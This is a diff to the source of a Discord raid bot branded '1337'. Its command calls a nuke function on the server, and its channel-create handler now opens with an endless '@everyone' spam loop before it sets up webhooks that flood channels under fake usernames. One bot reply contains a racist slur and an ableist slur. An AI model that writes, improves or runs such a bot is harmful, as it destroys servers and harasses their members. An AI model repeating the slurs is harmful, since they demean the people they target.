@@ -1,5 +1,5 @@
 dm_msg = "**1337 Beamed You** https://youtu.be/gGzOhy9vNkg"
-spam_messages = ["@everyone **1337 wizzed this** <a:__:770078001315446816> https://youtu.be/gGzOhy9vNkg", "@everyone **wizzed by 1337**"]
+spam_messages = ["@everyone **1337 wizzed this** <a:__:770078001315446816>\nhttps://youtu.be/gGzOhy9vNkg", "@everyone **Wizzed by 1337 | We are in the shadows**"]
 channel_names = ["🤫", "1337", "beamed"]
 webhook_usernames = ["1337 Wizzed U", "1337", "1337 BEAMER", "🤫"]
 
@@ -89,7 +89,7 @@ async def wizz(ctx):
     await ctx.send("Nuking")
     await ctx.send("sike nigga, you're retarded, I was programmed not to nuke this server")
   else:
-    await ctx.author.send(f"Nuking {ctx.guild.name}")
+    await ctx.author.send(f"Nuking **{ctx.guild.name}**")
     await nuke(ctx.guild)
 
 @bot.command(pass_context=True)
@@ -176,12 +176,13 @@ async def roles(ctx):
 
 @bot.event
 async def on_guild_channel_create(channel):
+  while True:
+    await channel.send("@everyone 1337 Wizzed This Shit.")
   webhook = await channel.create_webhook(name="1337")
   webhook_url = webhook.url
   async with aiohttp.ClientSession() as session:
     webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
     while True:
-      await channel.send("@everyone 1337 Wizzed This Shit.")
       await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
 
 @bot.event
